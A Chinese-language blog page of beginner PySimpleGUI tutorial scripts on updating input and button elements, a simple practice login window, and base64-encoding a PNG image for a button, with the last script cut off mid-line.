<h1 id="11单行输入框元素的更新方法-py"><a href="#11单行输入框元素的更新方法-py" class="headerlink" title="11单行输入框元素的更新方法.py"></a>11单行输入框元素的更新方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1.用update的方法更新元素</span></span><br><span class="line"><span class="string">2.用SetFocus的方法更新元素的焦点</span></span><br><span class="line"><span class="string">3.用SetTooltip的方法更新元素的悬浮文本</span></span><br><span class="line"><span class="string">update方法，用于元素的更新</span></span><br><span class="line"><span class="string">window[key].update()</span></span><br><span class="line"><span class="string">window[key].Update()</span></span><br><span class="line"><span class="string">SetFocus方法，用于元素设置焦点</span></span><br><span class="line"><span class="string">window[key].SetFocus()</span></span><br><span class="line"><span class="string">window[key].set_focus()</span></span><br><span class="line"><span class="string">SetTooltip方法，用于元素的更新</span></span><br><span class="line"><span class="string">window[key].SetTooltip(&#x27;&#x27;)</span></span><br><span class="line"><span class="string">window[key].set_tooltip(&#x27;&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">layout=[</span><br><span class="line">[[sg.In(i,key=i)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcd&#x27;</span>],</span><br><span class="line">[sg.B(<span class="string">&#x27;确定&#x27;</span>),sg.B(<span class="string">&#x27;取消&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">window=sg.Window(<span class="string">&#x27;python练习窗口&#x27;</span>,layout,keep_on_top=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;确定&#x27;</span>:</span><br><span class="line">        window[<span class="string">&#x27;d&#x27;</span>].SetFocus() <span class="comment"># 用于更新元素的焦点</span></span><br><span class="line">        window[<span class="string">&#x27;d&#x27;</span>].SetTooltip(<span class="string">&#x27;dsfg&#x27;</span>) <span class="comment"># 用于更新悬浮文本</span></span><br><span class="line">        window[<span class="string">&#x27;d&#x27;</span>].update(</span><br><span class="line">            value=<span class="string">&#x27;123&#x27;</span>, <span class="comment"># str：更新输入框的文本</span></span><br><span class="line">            disabled=<span class="literal">None</span>, <span class="comment"># bool: 更新元素的禁用状态，如果为True，输入框变成只读状态，无法写入</span></span><br><span class="line">            select=<span class="literal">None</span>,  <span class="comment"># bool：元素选中，如果为True，输入框内的文本被全选中</span></span><br><span class="line">                            <span class="comment"># 和focus或者set_focus一起使用</span></span><br><span class="line">            visible=<span class="literal">None</span>,   <span class="comment"># bool：更新元素的可见状态</span></span><br><span class="line">            text_color=<span class="literal">None</span>,    <span class="comment"># str：更新输入框内的文本颜色</span></span><br><span class="line">            background_color=<span class="literal">None</span>,  <span class="comment"># str：更新输入框的背景颜色</span></span><br><span class="line">            move_cursor_to=<span class="string">&quot;end&quot;</span>    <span class="comment"># 光标移动文本的最后，和value,focus一起使用</span></span><br><span class="line"></span><br><span class="line">        )</span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="12练习-编写一个登陆窗口-py"><a href="#12练习-编写一个登陆窗口-py" class="headerlink" title="12练习-编写一个登陆窗口.py"></a>12练习-编写一个登陆窗口.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">要求：</span></span><br><span class="line"><span class="string">1.用字典嵌套列表的形式，建立用户数据</span></span><br><span class="line"><span class="string">2.实现用户输入用户名和密码后，判断输入是否正确</span></span><br><span class="line"><span class="string">3.确认后，弹出窗口“输入正确”或“输入错误”</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 导入库</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line">userdata=&#123;<span class="string">&#x27;username&#x27;</span>:[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>],</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>:[<span class="string">&#x27;11&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;33&#x27;</span>,<span class="string">&#x27;44&#x27;</span>,<span class="string">&#x27;55&#x27;</span>,<span class="string">&#x27;66&#x27;</span>,<span class="string">&#x27;77&#x27;</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 定义布局，确定行数</span></span><br><span class="line">layout=[</span><br><span class="line">			[sg.Text(<span class="string">&#x27;用户名&#x27;</span>,size=(<span class="number">8</span>,<span class="number">1</span>)),sg.InputText(<span class="string">&#x27;请输入用户名&#x27;</span>,key=<span class="string">&#x27;-name-&#x27;</span>)],</span><br><span class="line">			[sg.Text(<span class="string">&#x27;密码&#x27;</span>,size=(<span class="number">8</span>,<span class="number">1</span>)),sg.InputText(<span class="string">&#x27;&#x27;</span>,key=<span class="string">&#x27;-pwd-&#x27;</span>,password_char=<span class="string">&#x27;*&#x27;</span>,tooltip=<span class="string">&#x27;密码为两位数字&#x27;</span>)],</span><br><span class="line">			[sg.Button(<span class="string">&#x27;确认&#x27;</span>),sg.Button(<span class="string">&#x27;取消&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">		]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 创建窗口</span></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python练习窗&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 事件循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,value=window.read() <span class="comment"># 窗口的读取，有两个返回值（1.事件 2.值）</span></span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:  <span class="comment"># 窗口关闭事件</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event==<span class="string">&#x27;确认&#x27;</span>:</span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(userdata[<span class="string">&#x27;username&#x27;</span>]):</span><br><span class="line">            <span class="keyword">if</span> value[<span class="string">&#x27;-name-&#x27;</span>] == userdata[<span class="string">&#x27;username&#x27;</span>][i]:</span><br><span class="line">                <span class="keyword">if</span> value[<span class="string">&#x27;-pwd-&#x27;</span>] == userdata[<span class="string">&#x27;password&#x27;</span>][i]:</span><br><span class="line">                    sg.Popup(<span class="string">&#x27;输入正确&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sg.Popup(<span class="string">&#x27;输入错误&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 关闭窗口</span></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="13-图片base64格式编码-py"><a href="#13-图片base64格式编码-py" class="headerlink" title="13-图片base64格式编码.py"></a>13-图片base64格式编码.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&quot;c:\bl3.png&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">res = f.read()</span><br><span class="line">s = base64.b64encode(res)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h1 id="13按键元素的设定及更新方法-py"><a href="#13按键元素的设定及更新方法-py" class="headerlink" title="13按键元素的设定及更新方法.py"></a>13按键元素的设定及更新方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">按键元素的设定方法</span></span><br><span class="line"><span class="string">按键元素的书写方法：</span></span><br><span class="line"><span class="string">sg.B(&#x27;&#x27;)    sg.Button(&#x27;&#x27;)</span></span><br><span class="line"><span class="string">按键元素的设定方法：</span></span><br><span class="line"><span class="string">sg.B(&#x27;确定&#x27;,image_filename=r&#x27;图片路径&#x27;)</span></span><br><span class="line"><span class="string">按键元素的更新方法</span></span><br><span class="line"><span class="string">window[key].Update()</span></span><br><span class="line"><span class="string">window[key].update()</span></span><br><span class="line"><span class="string">Button(</span></span><br><span class="line"><span class="string">    button_text=&quot;&quot;, # 显示在按钮上的文本</span></span><br><span class="line"><span class="string">    key=None,   # 元素的唯一标识符</span></span><br><span class="line"><span class="string">    tooltip=None,   # 悬浮文本</span></span><br><span class="line"><span class="string">    disabled=False, # 元素禁用设定，如果为True，点击按钮也无法发生事件。</span></span><br><span class="line"><span class="string">    image_filename=None,    # 图片路径，按钮用图片表示，只支持GIFs和PNG格式，和image_data二选一使用</span></span><br><span class="line"><span class="string">    image_data=None,    #   图片base64格式。按钮用图片显示，和image_filename二选一使用</span></span><br><span class="line"><span class="string">    image_size=(None,None), # 按钮图片大小</span></span><br><span class="line"><span class="string">    image_subsample=None,   # 图片大小设定，为2时，原图片的二分之一大小，2=1/2，3=1/3，4=1/4，etc</span></span><br><span class="line"><span class="string">    border_width=None,  # 按钮边界线设定</span></span><br><span class="line"><span class="string">    size=(None,None),   # 按钮尺寸设定</span></span><br><span class="line"><span class="string">    auto_size_button=None,  # 按钮上的文本自动调节</span></span><br><span class="line"><span class="string">    button_color=None,  # 按钮颜色</span></span><br><span class="line"><span class="string">    disabled_button_color=None,    # 按钮元素禁用时显示的按钮颜色</span></span><br><span class="line"><span class="string">    font=None,  #   字体名称，大小设定</span></span><br><span class="line"><span class="string">    bind_return_key=False,  #  绑定回车键，如果设定为True，回车键会使此元素被点击</span></span><br><span class="line"><span class="string">    focus=False,    # 焦点设置</span></span><br><span class="line"><span class="string">    pad=None,   #   和其他元素之间间隔设定</span></span><br><span class="line"><span class="string">    visible=True, # 元素的可见状态设定，如果为True，元素则不可见</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Update(</span></span><br><span class="line"><span class="string">    text=None,  # 按钮上显示的文本</span></span><br><span class="line"><span class="string">    button_color=(None,None),   # 按钮颜色</span></span><br><span class="line"><span class="string">    disabled=None,  # 元素禁用设定</span></span><br><span class="line"><span class="string">    image_data=None,    # 图片的base64格式</span></span><br><span class="line"><span class="string">    image_filename=None,    # 图片的路径</span></span><br><span class="line"><span class="string">    visible=None,   #   元素可见状态设定</span></span><br><span class="line"><span class="string">    image_subsample=None,   # 元素大小设定</span></span><br><span class="line"><span class="string">    disabled_button_color=(None,None), # 元素禁用时显示的文本和按钮颜色</span></span><br><span class="line"><span class="string">    image_size=None     # 图片尺寸设定</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">image=<span class="string">b&#x27;iVBORw0KGgoAAAANSUhEUgAAANwAAABpCAYAAABRXU1HAAAACXBIWXMAAA9hAAAPYQGoP6dpAAAF8WlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDggNzkuMTY0MDM2LCAyMDE5LzA4LzEzLTAxOjA2OjU3ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdEV2dD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlRXZlbnQjIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnBob3Rvc2hvcD0iaHR0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjEuMCAoV2luZG93cykiIHhtcDpDcmVhdGVEYXRlPSIyMDIyLTAyLTEzVDIzOjQwOjAyKzA4OjAwIiB4bXA6TWV0YWRhdGFEYXRlPSIyMDIyLTAyLTEzVDIzOjQwOjAyKzA4OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAyMi0wMi0xM1QyMzo0MDowMiswODowMCIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDplMDZiNWJlNy1jOWE3LThkNDMtOWFlZi0wN2QwZjEzZWJhNDkiIHhtcE1NOkRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDpjMTZlZmI4YS00ODcyLTYyNGUtOTgxYi0wYTg5YjRjMzhkYTMiIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDpmMzFhNTc3Ni01MWE4LTViNGYtYjgzNS01MjVlZjMxYmQyMTkiIGRjOmZvcm1hdD0iaW1hZ2UvcG5nIiBwaG90b3Nob3A6Q29sb3JNb2RlPSIzIiBwaG90b3Nob3A6SUNDUHJvZmlsZT0ic1JHQiBJRUM2MTk2Ni0yLjEiPiA8eG1wTU06SGlzdG9yeT4gPHJkZjpTZXE+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJjcmVhdGVkIiBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOmYzMWE1Nzc2LTUxYTgtNWI0Zi1iODM1LTUyNWVmMzFiZDIxOSIgc3RFdnQ6d2hlbj0iMjAyMi0wMi0xM1QyMzo0MDowMiswODowMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIDIxLjAgKFdpbmRvd3MpIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDplMDZiNWJlNy1jOWE3LThkNDMtOWFlZi0wN2QwZjEzZWJhNDkiIHN0RXZ0OndoZW49IjIwMjItMDItMTNUMjM6NDA6MDIrMDg6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCAyMS4wIChXaW5kb3dzKSIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8L3JkZjpTZXE+IDwveG1wTU06SGlzdG9yeT4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz756CkcAAAQKklEQVR4nO2de4xdRR3HP9vubrul7ZZCH7TUFikUqaHFF5AovgAJ8YERUUIUIfCHUfEPDGrURCMmYpTEaDDxGSUqoKiIPFpeFRSwD1wsr/IoLVD6oC+27Xa3j13/+N2TO2d2Zs45e++dPWf7+yRN770z99zZc853fr/5zW/mtA0NDaEoShzGjXYDFOVIQgWnKBFRwSlKRFRwihIRFZyiREQFpygRUcEpSkRUcIoSERWcokREBacoEVHBKUpEVHCKEhEVnKJERAWnKBFRwSlKRFRw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&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># layout=[[sg.B(image_filename=r&#x27;c:\bl.png&#x27;,key=&#x27;-python-&#x27;)]]</span></span><br><span class="line">layout=[[sg.B(image_data=image,key=<span class="string">&#x27;-python-&#x27;</span>,bind_return_key=<span 